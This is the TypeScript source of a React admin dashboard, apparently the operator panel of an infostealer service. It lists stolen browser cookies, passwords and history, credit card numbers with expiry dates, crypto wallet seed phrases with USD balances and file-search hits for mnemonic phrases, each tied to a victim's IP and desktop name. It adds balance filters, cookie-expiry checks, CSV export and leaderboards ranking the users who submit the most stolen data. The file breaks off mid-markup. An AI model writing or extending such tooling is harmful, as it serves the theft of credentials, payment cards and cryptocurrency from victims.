import React, { useState, useEffect, useCallback, memo } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { LoadingSpinner } from '@/components/common/LoadingSpinner';
import {
  Search,
  Filter,
  RefreshCw,
  Database,
  Globe,
  Folder,
  Wallet,
  ChevronLeft,
  ChevronRight,
  Download,
  Eye,
  Calendar,
} from 'lucide-react';
import { toast } from 'sonner';

interface BrowserSubmission {
  id: string;
  user_id: number;
  username: string;
  browser: string;
  type: string;
  data: any;
  desktop_name: string;
  ip_address: string;
  created_at: string;
}

interface FilesearchSubmission {
  id: string;
  user_id: number;
  username: string;
  pattern: string;
  line: string;
  data: {
    balance?: number;
  };
  ip_address: string;
  created_at: string;
}

interface WalletSubmission {
  id: string;
  user_id: number;
  username: string;
  wallet: string;
  mnemonic: string;
  balance_usd?: number;
  ip_address: string;
  created_at: string;
}

interface SubmissionFilters {
  search: string;
  browser: 'all' | 'chrome' | 'firefox' | 'edge' | 'safari' | 'other' | '';
  dataType: 'all' | 'cookies' | 'passwords' | 'history' | 'bookmarks' | '';
  ipAddress: string;
  desktopName: string;
  username: string;
  minBalance: string;
  sortByBalance: string;
}

interface SubmissionTypeStats {
  type: string;
  count: number;
  unique_users: number;
}

interface TopSubmitter {
  id: number;
  username: string;
  browser_count: number;
  filesearch_count: number;
  wallet_count: number;
  total_submissions: number;
}

interface SubmissionStats {
  byType: SubmissionTypeStats[];
  totalUsers: number;
  topSubmitters: TopSubmitter[];
}

interface InviteUserStats {
  id: number;
  username: string;
  invites_created: number;
  users_invited: number;
  has_active_subscription?: number; // 1/0
}

// ---- Browser Submissions Tab (extracted to keep stable component identity) ----
interface BrowserTabProps {
  filters: { search: string };
  onFilterChange: (partial: Partial<{ search: string }>) => void;
  onApply: () => void;
  onClear: () => void;
  onExport: (format: string) => void;
  submissions: BrowserSubmission[];
  loading: boolean;
  page: number;
  totalPages: number;
  onPageChange: (page: number) => void;
  formatDate: (date: string) => string;
  onView: (submission: BrowserSubmission) => void;
}

const BrowserSubmissionsTabComponent: React.FC<BrowserTabProps> = ({
  filters,
  onFilterChange,
  onApply,
  onClear,
  onExport,
  submissions,
  loading,
  page,
  totalPages,
  onPageChange,
  formatDate,
  onView,
}) => {
  // Separate credit card submissions from others
  const creditCardSubmissions = submissions.filter((s) => s.type === 'credit_cards');
  const normalSubmissions = submissions.filter((s) => s.type !== 'credit_cards');

  // Helper to extract (possibly multiple) card records from a single submission's data
  const extractCards = (submission: BrowserSubmission) => {
    const d: any = submission.data || {};
    let cards: any[] = [];
    if (Array.isArray(d))
      cards = d; // data is already an array of cards
    else if (Array.isArray(d.cards)) cards = d.cards;
    else if (Array.isArray(d.credit_cards)) cards = d.credit_cards;
    else if (d.number || d.card_number) cards = [d]; // single card object

    return cards.map((c, idx) => {
      const name = c.name || c.cardholder || c.holder || c.name_on_card || c.card_name || 'Unknown';
      const number = c.number || c.card_number || c.cc || 'N/A';
      const expMonthRaw =
        c.exp_month ?? c.month ?? c.mm ?? c.expiry_month ?? c.expiration_month ?? '';
      const expYearRaw = c.exp_year ?? c.year ?? c.yy ?? c.expiry_year ?? c.expiration_year ?? '';
      const expMonth = expMonthRaw !== '' ? String(expMonthRaw).padStart(2, '0') : '';
      let expYear = '';
      if (expYearRaw !== '') {
        const yStr = String(expYearRaw);
        expYear = yStr.length === 4 ? yStr.slice(-2) : yStr; // show YY
      }
      return {
        key: `${submission.id}-${idx}`,
        submissionId: submission.id,
        name,
        number,
        expMonth,
        expYear,
        raw: c,
        created_at: submission.created_at,
      };
    });
  };

  const flattenedCreditCards = creditCardSubmissions.flatMap(extractCards);

  return (
    <div className="flex flex-col gap-6">
      {/* Filters */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Filter className="h-5 w-5" />
            Browser Submission Filters
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="flex flex-col gap-2">
              <label className="text-sm font-medium" htmlFor="browser-search-input">
                Search
              </label>
              <Input
                id="browser-search-input"
                placeholder="Username, IP, browser, type..."
                value={filters.search}
                onChange={(e) => onFilterChange({ search: e.target.value })}
                // Prevent parent hot re-mounts from stealing focus
                autoComplete="off"
              />
            </div>
          </div>

          <div className="flex gap-2 mt-4">
            <Button onClick={onApply} size="sm">
              Apply Filters
            </Button>
            <Button onClick={onClear} variant="outline" size="sm">
              Clear Filters
            </Button>
            <Button onClick={() => onExport('csv')} variant="outline" size="sm">
              <Download className="h-4 w-4 mr-2" />
              Export CSV
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Browser Submissions Table (excluding credit cards) */}
      <Card>
        <CardHeader>
          <CardTitle>Browser Submissions ({normalSubmissions.length})</CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex justify-center py-8">
              <LoadingSpinner />
            </div>
          ) : (
            <>
              <div className="overflow-x-auto">
                <table className="w-full border-collapse">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left p-2 font-medium">ID</th>
                      <th className="text-left p-2 font-medium">Username</th>
                      <th className="text-left p-2 font-medium">Browser</th>
                      <th className="text-left p-2 font-medium">Data Type</th>
                      <th className="text-left p-2 font-medium">IP Address</th>
                      <th className="text-left p-2 font-medium">Desktop</th>
                      <th className="text-left p-2 font-medium">Created</th>
                      <th className="text-left p-2 font-medium">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {normalSubmissions.map((submission) => (
                      <tr key={submission.id} className="border-b hover:bg-secondary/20">
                        <td className="p-2">{submission.id}</td>
                        <td className="p-2 font-medium">{submission.username}</td>
                        <td className="p-2">
                          <Badge variant="outline">{submission.browser}</Badge>
                        </td>
                        <td className="p-2">
                          <Badge variant="secondary">{submission.type}</Badge>
                        </td>
                        <td className="p-2">{submission.ip_address}</td>
                        <td className="p-2">{submission.desktop_name}</td>
                        <td className="p-2">{formatDate(submission.created_at)}</td>
                        <td className="p-2">
                          <Button size="sm" variant="outline" onClick={() => onView(submission)}>
                            <Eye className="h-3 w-3" />
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Pagination */}
              {totalPages > 1 && (
                <div className="flex items-center justify-between mt-4">
                  <div className="text-sm text-muted-foreground">
                    Page {page} of {totalPages}
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => onPageChange(page - 1)}
                      disabled={page === 1}
                    >
                      <ChevronLeft className="h-4 w-4" />
                      Previous
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => onPageChange(page + 1)}
                      disabled={page === totalPages}
                    >
                      Next
                      <ChevronRight className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              )}
            </>
          )}
        </CardContent>
      </Card>

      {flattenedCreditCards.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle>Credit Cards ({flattenedCreditCards.length})</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <table className="w-full border-collapse">
                <thead>
                  <tr className="border-b">
                    <th className="text-left p-2 font-medium">Submission ID</th>
                    <th className="text-left p-2 font-medium">Name</th>
                    <th className="text-left p-2 font-medium">Number</th>
                    <th className="text-left p-2 font-medium">Month/Yr</th>
                    <th className="text-left p-2 font-medium">Created</th>
                    <th className="text-left p-2 font-medium">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {flattenedCreditCards.map((card) => {
                    const monthDisplay = card.expMonth || '??';
                    const yearDisplay = card.expYear || '??';
                    return (
                      <tr key={card.key} className="border-b hover:bg-secondary/20">
                        <td className="p-2 text-xs break-all">{card.submissionId}</td>
                        <td className="p-2">{card.name}</td>
                        <td className="p-2 font-mono text-sm">{card.number}</td>
                        <td className="p-2">
                          {monthDisplay}/{yearDisplay}
                        </td>
                        <td className="p-2 text-xs">{formatDate(card.created_at)}</td>
                        <td className="p-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => {
                              const original = creditCardSubmissions.find(
                                (s) => s.id === card.submissionId,
                              );
                              if (original) onView(original);
                            }}
                          >
                            <Eye className="h-3 w-3" />
                          </Button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
};

const BrowserSubmissionsTab = memo(BrowserSubmissionsTabComponent);

// ---- Enhanced Wallet Submissions Tab ----
interface WalletTabProps {
  submissions: WalletSubmission[];
  loading: boolean;
  filters: { minBalance: string; username: string };
  onFilterChange: (p: Partial<{ minBalance: string; username: string }>) => void;
  onApply: () => void;
  onClear: () => void;
  onExport: (format: string) => void;
  formatDate: (d: string) => string;
  formatBalance: (b?: number | string) => string;
}

const WalletSubmissionsTabEnhanced: React.FC<WalletTabProps> = memo(
  ({
    submissions,
    loading,
    filters,
    onFilterChange,
    onApply,
    onClear,
    onExport,
    formatDate,
    formatBalance,
  }) => {
    return (
      <div className="flex flex-col gap-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Filter className="h-5 w-5" /> Wallet Submission Filters
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid gap-4 md:grid-cols-3">
              <div className="flex flex-col gap-2">
                <label htmlFor="wallet-username" className="text-sm font-medium">
                  Username / Search
                </label>
                <Input
                  id="wallet-username"
                  placeholder="Username..."
                  value={filters.username}
                  onChange={(e) => onFilterChange({ username: e.target.value })}
                  autoComplete="off"
                />
              </div>
              <div className="flex flex-col gap-2">
                <label htmlFor="wallet-min-balance" className="text-sm font-medium">
                  Min Balance (USD)
                </label>
                <Input
                  id="wallet-min-balance"
                  type="number"
                  min={0}
                  step="0.01"
                  placeholder="0"
                  value={filters.minBalance}
                  onChange={(e) => onFilterChange({ minBalance: e.target.value })}
                />
              </div>
            </div>
            <div className="flex flex-wrap gap-2 mt-4">
              <Button size="sm" onClick={onApply}>
                Apply Filters
              </Button>
              <Button size="sm" variant="outline" onClick={onClear}>
                Clear
              </Button>
              <Button size="sm" variant="outline" onClick={() => onExport('csv')}>
                <Download className="h-4 w-4 mr-2" /> Export CSV
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Wallet className="h-5 w-5" /> Wallet Submissions ({submissions.length})
            </CardTitle>
          </CardHeader>
          <CardContent>
            {loading ? (
              <div className="flex justify-center py-8">
                <LoadingSpinner />
              </div>
            ) : submissions.length === 0 ? (
              <div className="py-10 text-center text-muted-foreground text-sm">
                No wallet submissions found.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-sm align-top">
                  <thead>
                    <tr className="border-b bg-muted/40">
                      <th className="p-2 text-left font-medium">ID</th>
                      <th className="p-2 text-left font-medium">User</th>
                      <th className="p-2 text-left font-medium">Wallet</th>
                      <th className="p-2 text-left font-medium">Mnemonic / Seed</th>
                      <th className="p-2 text-left font-medium">Balance</th>
                      <th className="p-2 text-left font-medium">IP</th>
                      <th className="p-2 text-left font-medium">Created</th>
                    </tr>
                  </thead>
                  <tbody>
                    {submissions.map((s) => {
                      const highlight = typeof s.balance_usd === 'number' && s.balance_usd >= 1000;
                      return (
                        <tr key={s.id} className="border-b hover:bg-secondary/30 transition-colors">
                          <td className="p-2 font-mono text-[11px] text-muted-foreground">
                            {s.id}
                          </td>
                          <td className="p-2 font-medium">{s.username}</td>
                          <td className="p-2">
                            <Badge variant="outline" className="capitalize">
                              {s.wallet || 'Unknown'}
                            </Badge>
                          </td>
                          <td className="p-2">
                            <div className="max-h-24 overflow-auto rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed break-words whitespace-pre-wrap">
                              {s.mnemonic || 'N/A'}
                            </div>
                          </td>
                          <td className="p-2 whitespace-nowrap">
                            <span
                              className={
                                highlight
                                  ? 'font-semibold text-success'
                                  : ''
                              }
                            >
                              {formatBalance(s.balance_usd)}
                            </span>
                          </td>
                          <td className="p-2 text-xs">{s.ip_address}</td>
                          <td className="p-2 text-xs whitespace-nowrap">
                            {formatDate(s.created_at)}
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    );
  },
);

export function SubmissionsManagement() {
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('overview');
  const [stats, setStats] = useState<SubmissionStats | null>(null);
  const [inviteLeaderboard, setInviteLeaderboard] = useState<InviteUserStats[]>([]);
  const [inviteLoading, setInviteLoading] = useState(false);

  // Browser submissions
  const [browserSubmissions, setBrowserSubmissions] = useState<BrowserSubmission[]>([]);
  const [browserFilters, setBrowserFilters] = useState({
    search: '',
  });
  const [browserPage, setBrowserPage] = useState(1);
  const [browserTotalPages, setBrowserTotalPages] = useState(1);
  // Viewer state for browser submissions
  const [selectedBrowserSubmission, setSelectedBrowserSubmission] =
    useState<BrowserSubmission | null>(null);
  const [showBrowserModal, setShowBrowserModal] = useState(false);

  // Derive cookie expiration status for the currently selected browser submission (if cookies)
  const cookieStatus = React.useMemo(() => {
    if (!selectedBrowserSubmission || selectedBrowserSubmission.type !== 'cookies') return null;
    try {
      const rawData = selectedBrowserSubmission.data;
      let parsed: any = null;
      if (typeof rawData === 'string') {
        try {
          parsed = JSON.parse(rawData);
        } catch (e) {
          parsed = {};
        }
      } else {
        parsed = rawData || {};
      }
      const expNum = Number(parsed?.expires_utc ?? parsed?.expires);
      if (isNaN(expNum) || expNum === 0) {
        return { expired: false, expiryDate: null, session: true };
      }
      let jsTime: number | null = null;
      if (expNum > 1e14) {
        // Webkit microseconds since 1601
        jsTime = Math.floor(expNum / 1000) - 11644473600000;
      } else if (expNum > 1e12) {
        // ms since 1970
        jsTime = expNum;
      } else {
        // seconds since 1970
        jsTime = expNum * 1000;
      }
      if (jsTime && !isNaN(jsTime)) {
        const expired = jsTime < Date.now();
        const expiryDate = new Date(jsTime).toLocaleString();
        return { expired, expiryDate, session: false };
      }
      return { expired: false, expiryDate: null, session: true };
    } catch (e) {
      return null;
    }
  }, [selectedBrowserSubmission]);

  // Filesearch submissions
  const [filesearchSubmissions, setFilesearchSubmissions] = useState<FilesearchSubmission[]>([]);
  const [filesearchFilters, setFilesearchFilters] = useState({
    minBalance: '',
    username: '',
  });

  // Wallet submissions
  const [walletSubmissions, setWalletSubmissions] = useState<WalletSubmission[]>([]);
  const [walletFilters, setWalletFilters] = useState({
    minBalance: '',
    username: '',
  });

  const pageSize = 10;

  useEffect(() => {
    loadStats();
    if (activeTab === 'overview') {
      loadInviteLeaderboard();
    }
    if (activeTab === 'browser') {
      loadBrowserSubmissions();
    } else if (activeTab === 'filesearch') {
      loadFilesearchSubmissions();
    } else if (activeTab === 'wallets') {
      loadWalletSubmissions();
    }
  }, [activeTab, browserPage]);

  const loadStats = async () => {
    try {
      const response = await fetch('/admin/api/stats', {
        credentials: 'include',
      });

      if (!response.ok) {
        throw new Error(`Failed to load stats: ${response.status} ${response.statusText}`);
      }

      const data = await response.json();
      setStats(data.stats); // Extract the stats property from the response
    } catch (error) {
      console.error('❌ Error loading stats:', error);
      toast.error('Failed to load submission stats');
    }
  };

  const loadBrowserSubmissions = async (page = browserPage) => {
    try {
      setLoading(true);
      // Build params that match the actual API
      const params = new URLSearchParams();
      params.set('page', page.toString());
      params.set('limit', pageSize.toString());
      if (browserFilters.search) params.set('search', browserFilters.search);
      const response = await fetch(`/admin/api/submissions/browser?${params}`, {
        credentials: 'include',
      });

      if (!response.ok) {
        throw new Error('Failed to load browser submissions');
      }

      const data = await response.json();
      setBrowserSubmissions(data.submissions || []);
      setBrowserTotalPages(data.totalPages || 1);
      setBrowserPage(data.page || 1);
    } catch (error) {
      console.error('Error loading browser submissions:', error);
      toast.error('Failed to load browser submissions');
    } finally {
      setLoading(false);
    }
  };

  const loadFilesearchSubmissions = async () => {
    try {
      setLoading(true);
      // Build params that match the actual API
      const params = new URLSearchParams();
      if (filesearchFilters.username) params.set('search', filesearchFilters.username);
      if (filesearchFilters.minBalance) params.set('minBalance', filesearchFilters.minBalance);

      const response = await fetch(`/admin/api/submissions/filesearch?${params}`, {
        credentials: 'include',
      });

      if (!response.ok) {
        throw new Error('Failed to load filesearch submissions');
      }

      const data = await response.json();

      setFilesearchSubmissions(data.submissions || []);
    } catch (error) {
      console.error('Error loading filesearch submissions:', error);
      toast.error('Failed to load filesearch submissions');
    } finally {
      setLoading(false);
    }
  };

  const loadWalletSubmissions = async () => {
    try {
      setLoading(true);
      // Build params that match the actual API
      const params = new URLSearchParams();
      if (walletFilters.username) params.set('search', walletFilters.username);
      if (walletFilters.minBalance) params.set('minBalance', walletFilters.minBalance);

      const response = await fetch(`/admin/api/submissions/wallets?${params}`, {
        credentials: 'include',
      });

      if (!response.ok) {
        throw new Error('Failed to load wallet submissions');
      }

      const data = await response.json();

      setWalletSubmissions(data.submissions || []);
    } catch (error) {
      console.error('Error loading wallet submissions:', error);
      toast.error('Failed to load wallet submissions');
    } finally {
      setLoading(false);
    }
  };

  const clearBrowserFilters = () => {
    setBrowserFilters({
      search: '',
    });
    setBrowserPage(1);
    loadBrowserSubmissions(1);
  };

  const exportData = async (type: string, format: string) => {
    try {
      const response = await fetch(`/admin/api/submissions/export/${type}?format=${format}`, {
        credentials: 'include',
      });

      if (!response.ok) {
        throw new Error('Failed to export data');
      }

      const blob = await response.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${type}-submissions-${new Date().toISOString().split('T')[0]}.${format}`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      toast.success(`${type} data exported successfully`);
    } catch (error) {
      console.error('Error exporting data:', error);
      toast.error('Failed to export data');
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const formatBalance = (balance?: number | string) => {
    if (balance === undefined || balance === null) return 'N/A';
    const numBalance = typeof balance === 'string' ? parseFloat(balance) : balance;
    if (isNaN(numBalance)) return 'N/A';
    return `$${numBalance.toFixed(2)}`;
  };

  const loadInviteLeaderboard = async () => {
    try {
      setInviteLoading(true);
      const res = await fetch('/admin/api/users', { credentials: 'include' });
      if (!res.ok) throw new Error('Failed users');
      const data = await res.json();
      const users: InviteUserStats[] = (data.users || [])
        .map((u: any) => ({
          id: u.id,
          username: u.username,
          invites_created: Number(u.invites_created) || 0,
          users_invited: Number(u.users_invited) || 0,
          has_active_subscription: u.has_active_subscription,
        }))
        .filter((u: InviteUserStats) => u.invites_created > 0 || u.users_invited > 0);
      users.sort(
        (a, b) => b.invites_created - a.invites_created || b.users_invited - a.users_invited,
      );
      setInviteLeaderboard(users.slice(0, 5));
    } catch (e) {
      console.error('Failed to load invite leaderboard', e);
    } finally {
      setInviteLoading(false);
    }
  };

  // Helper functions to extract stats from the API response
  const getBrowserCount = () => {
    return stats?.byType.find((t) => t.type === 'browser')?.count || 0;
  };

  const getFilesearchCount = () => {
    return stats?.byType.find((t) => t.type === 'filesearch')?.count || 0;
  };

  const getWalletCount = () => {
    return stats?.byType.find((t) => t.type === 'wallets')?.count || 0;
  };

  const getTotalSubmissions = () => {
    return stats?.byType.reduce((sum, t) => sum + t.count, 0) || 0;
  };

  const StatsOverview = useCallback(() => {
    const totalSubs = getTotalSubmissions();
    const topSubmitters = (stats?.topSubmitters || []).slice(0, 5);

    const rankBadge = (idx: number) => {
      const base = 'px-2 py-0.5 rounded text-xs font-semibold';
      if (idx === 0) return <span className={base + ' bg-yellow-500/90 text-black'}>🥇 1</span>;
      if (idx === 1) return <span className={base + ' bg-gray-300 text-black'}>🥈 2</span>;
      if (idx === 2) return <span className={base + ' bg-amber-700/80 text-white'}>🥉 3</span>;
      return <span className={base + ' bg-muted text-foreground/70'}>{idx + 1}</span>;
    };

    return (
      <div className="flex flex-col gap-8">
        {/* KPI Summary */}
        <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                <Database className="h-4 w-4 text-muted-foreground" /> Total Submissions
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold tracking-tight">{totalSubs}</div>
              <div className="mt-3 flex flex-wrap gap-2 text-xs">
                <span className="px-2 py-1 bg-muted rounded">Browser {getBrowserCount()}</span>
                <span className="px-2 py-1 bg-muted rounded">Files {getFilesearchCount()}</span>
                <span className="px-2 py-1 bg-muted rounded">Wallets {getWalletCount()}</span>
              </div>
            </CardContent>
          </Card>
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                <Database className="h-4 w-4 text-muted-foreground" /> Total Users
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold tracking-tight">{stats?.totalUsers || 0}</div>
              <div className="text-xs text-muted-foreground mt-2">
                Avg / User {stats?.totalUsers ? (totalSubs / stats.totalUsers).toFixed(1) : '0.0'}{' '}
                submissions
              </div>
            </CardContent>
          </Card>
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                <Globe className="h-4 w-4 text-muted-foreground" /> Browser Engagement
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold tracking-tight">{getBrowserCount()}</div>
              <div className="text-xs text-muted-foreground mt-2">Browser data points</div>
            </CardContent>
          </Card>
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                <Wallet className="h-4 w-4 text-muted-foreground" /> Wallet Captures
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-3xl font-bold tracking-tight">{getWalletCount()}</div>
              <div className="text-xs text-muted-foreground mt-2">Distinct wallet submissions</div>
            </CardContent>
          </Card>
        </div>

        <div className="grid gap-6 lg:grid-cols-2">
          {/* Submissions Leaderboard */}
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                🏆 Submissions Leaderboard
              </CardTitle>
            </CardHeader>
            <CardContent>
              {topSubmitters.length === 0 ? (
                <div className="text-sm text-muted-foreground py-6 text-center">
                  No submission data yet.
                </div>
              ) : (
                <div className="flex flex-col gap-2">
                  {topSubmitters.map((s, idx) => (
                    <div
                      key={s.id}
                      className="flex items-center justify-between border rounded-md p-3 hover:bg-muted/50 transition-colors"
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        {rankBadge(idx)}
                        <div className="min-w-0">
                          <div className="font-medium truncate">{s.username}</div>
                          <div className="text-[11px] text-muted-foreground">
                            B:{s.browser_count} F:{s.filesearch_count} W:{s.wallet_count}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-sm font-semibold">{s.total_submissions}</div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          {/* Invites Leaderboard */}
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium flex items-center gap-2">
                🎟️ Invites Leaderboard
              </CardTitle>
            </CardHeader>
            <CardContent>
              {inviteLoading ? (
                <div className="flex justify-center py-6">
                  <LoadingSpinner />
                </div>
              ) : inviteLeaderboard.length === 0 ? (
                <div className="text-sm text-muted-foreground py-6 text-center">
                  No invite activity.
                </div>
              ) : (
                <div className="flex flex-col gap-2">
                  {inviteLeaderboard.map((u, idx) => (
                    <div
                      key={u.id}
                      className="flex items-center justify-between border rounded-md p-3 hover:bg-muted/50 transition-colors"
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        {rankBadge(idx)}
                        <div className="min-w-0">
                          <div className="font-medium truncate">{u.username}</div>
                          <div className="text-[11px] text-muted-foreground">
                            Created: {u.invites_created} · Joined: {u.users_invited}
                          </div>
                        </div>
                      </div>
                      {u.has_active_subscription ? (
                        <Badge variant="secondary" className="text-[10px]">
                          Active Sub
                        </Badge>
                      ) : null}
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Breakdown Pills */}
        {stats?.byType && (
          <div className="flex flex-wrap gap-2">
            {stats.byType.map((t) => (
              <span
                key={t.type}
                className="px-3 py-1 rounded-full bg-muted text-xs flex items-center gap-2"
              >
                <Badge variant="outline" className="capitalize text-[10px]">
                  {t.type}
                </Badge>
                <span className="font-medium">{t.count}</span>
                <span className="text-muted-foreground">({t.unique_users} users)</span>
              </span>
            ))}
          </div>
        )}
      </div>
    );
  }, [
    stats,
    inviteLeaderboard,
    inviteLoading,
    getBrowserCount,
    getFilesearchCount,
    getWalletCount,
    getTotalSubmissions,
  ]);
  // ---- Enhanced Filesearch Submissions Tab ----
  interface FilesearchTabProps {
    submissions: FilesearchSubmission[];
    loading: boolean;
    filters: { minBalance: string; username: string };
    onFilterChange: (p: Partial<{ minBalance: string; username: string }>) => void;
    onApply: () => void;
    onClear: () => void;
    onExport: (format: string) => void;
    formatDate: (d: string) => string;
    formatBalance: (b?: number | string) => string;
  }

  const FilesearchSubmissionsTabEnhanced: React.FC<FilesearchTabProps> = memo(
    ({
      submissions,
      loading,
      filters,
      onFilterChange,
      onApply,
      onClear,
      onExport,
      formatDate,
      formatBalance,
    }) => {
      return (
        <div className="flex flex-col gap-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Filter className="h-5 w-5" /> Filesearch Filters
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid gap-4 md:grid-cols-3">
                <div className="flex flex-col gap-2">
                  <label htmlFor="filesearch-username" className="text-sm font-medium">
                    Username / Search
                  </label>
                  <Input
                    id="filesearch-username"
                    placeholder="Username..."
                    value={filters.username}
                    onChange={(e) => onFilterChange({ username: e.target.value })}
                    autoComplete="off"
                  />
                </div>
                <div className="flex flex-col gap-2">
                  <label htmlFor="filesearch-min-balance" className="text-sm font-medium">
                    Min Balance (USD)
                  </label>
                  <Input
                    id="filesearch-min-balance"
                    type="number"
                    min={0}
                    step="0.01"
                    placeholder="0"
                    value={filters.minBalance}
                    onChange={(e) => onFilterChange({ minBalance: e.target.value })}
                  />
                  <p className="text-[10px] text-muted-foreground">
                    Balance applies only to pattern = mnemonicPhrase
                  </p>
                </div>
              </div>
              <div className="flex flex-wrap gap-2 mt-4">
                <Button size="sm" onClick={onApply}>
                  Apply Filters
                </Button>
                <Button size="sm" variant="outline" onClick={onClear}>
                  Clear
                </Button>
                <Button size="sm" variant="outline" onClick={() => onExport('csv')}>
                  <Download className="h-4 w-4 mr-2" /> Export CSV
                </Button>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Folder className="h-5 w-5" /> Filesearch Submissions ({submissions.length})
              </CardTitle>
            </CardHeader>
            <CardContent>
              {loading ? (
                <div className="flex justify-center py-8">
                  <LoadingSpinner />
                </div>
              ) : submissions.length === 0 ? (
                <div className="py-10 text-center text-muted-foreground text-sm">
                  No filesearch submissions found.
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-sm align-top">
                    <thead>
                      <tr className="border-b bg-muted/40">
                        <th className="p-2 text-left font-medium">ID</th>
                        <th className="p-2 text-left font-medium">User</th>
                        <th className="p-2 text-left font-medium">Pattern</th>
                        <th className="p-2 text-left font-medium">Line Content</th>
                        <th className="p-2 text-left font-medium">Balance</th>
                        <th className="p-2 text-left font-medium">IP</th>
                        <th className="p-2 text-left font-medium">Created</th>
                      </tr>
                    </thead>
                    <tbody>
                      {submissions.map((s) => {
                        const showBalance = s.pattern === 'mnemonicPhrase';
                        const balanceCell = showBalance ? formatBalance(s.data?.balance) : 'N/A';
                        const highlight =
                          showBalance &&
                          typeof s.data?.balance === 'number' &&
                          s.data.balance >= 1000;
                        return (
                          <tr
                            key={s.id}
                            className="border-b hover:bg-secondary/30 transition-colors"
                          >
                            <td className="p-2 font-mono text-[11px] text-muted-foreground">
                              {s.id}
                            </td>
                            <td className="p-2 font-medium">{s.username}</td>
                            <td className="p-2">
                              <Badge variant="outline">{s.pattern}</Badge>
                            </td>
                            <td className="p-2">
                              <div className="max-h-24 overflow-auto rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed break-all whitespace-pre-wrap">
                                {s.line || 'N/A'}
                              </div>
                            </td>
                            <td className="p-2 whitespace-nowrap">
                              <span
                                className={
                                  highlight
                                    ? 'font-semibold text-success'
                                    : ''
                                }
                              >
                                {balanceCell}
                              </span>
                            </td>
                            <td className="p-2 text-xs">{s.ip_address}</td>
                            <td className="p-2 text-xs whitespace-nowrap">
                              {formatDate(s.created_at)}
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      );
    },
  );

  // Removed old WalletSubmissionsTab implementation in favor of WalletSubmissionsTabEnhanced

  return (
    <div className="flex flex-col gap-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Submissions Management</h1>
        <Button
          onClick={() => {
            loadStats();
            if (activeTab === 'browser') loadBrowserSubmissions();
            else if (activeTab === 'filesearch') loadFilesearchSubmissions();
            else if (activeTab === 'wallets') loadWalletSubmissions();
          }}
          variant="outline"
          size="sm"
        >
          <RefreshCw className="h-4 w-4 mr-2" />
          Refresh
        </Button>
      </div>
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <div className="mb-6 p-3 bg-card border rounded-lg shadow-sm">
          <div className="text-sm font-medium text-muted-foreground mb-3">
            Select a tab to view different submission types:
          </div>
          <TabsList className="w-full justify-start h-auto flex-wrap gap-2 bg-muted/50 p-2">
